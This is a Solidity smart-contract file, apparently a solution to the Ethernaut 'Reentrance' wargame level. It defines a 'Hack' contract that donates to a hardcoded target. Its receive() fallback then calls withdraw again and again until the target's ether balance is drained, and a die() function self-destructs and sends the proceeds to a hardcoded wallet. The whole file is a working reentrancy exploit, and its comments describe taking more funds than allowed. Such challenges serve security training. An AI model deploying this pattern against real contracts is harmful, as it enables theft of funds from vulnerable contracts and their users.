/**
 *Submitted for verification at Etherscan.io on 2022-08-02
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Reentrance {
  // we just create a basic function structure just like the original contract
  // this makes it easy to call the methods directly
  function donate(address _to) public payable {}
  function balanceOf(address _who) public view returns (uint balance) {}
  function withdraw(uint _amount) public {}
  receive() external payable {}
}

contract Hack {
    // the address of our Ethernaut instance
    address ethernautAddress = 0x03E3DFd87Aa4Ca720E546B952E9a81589267Ed96;

    // a reference to the original contract instance
    Reentrance public re; 
    constructor() payable {
        re = Reentrance(payable(ethernautAddress));
    }

    function donate(address receiver) public payable {
        // add our contact address to the list of people holding a balance
        re.donate{value: 1 ether}(receiver);
    }

    receive() external payable {
        // this is the fallback the will be triggered when we receive ether
        if (address(ethernautAddress).balance >= 1 ether) {
            // this allows us to quickly withdraw more funds that we should be able to
            re.withdraw(1 ether);
        }
    }

    function withDraw() public {
        // draw from the original contract and trigger our fallback
        re.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        // just here to see what balance is in this contract
        return address(this).balance;
    }

    function die() public {
        // get the funds out of our contract if we want to
        selfdestruct(payable(0xD3060621a7a65F0A5A03129509a4b584D6851368));
    }

        // Helper function to check the balance of this contract
    function getBalance2(address _to) public view returns (uint) {
        return address(_to).balance;
    }
}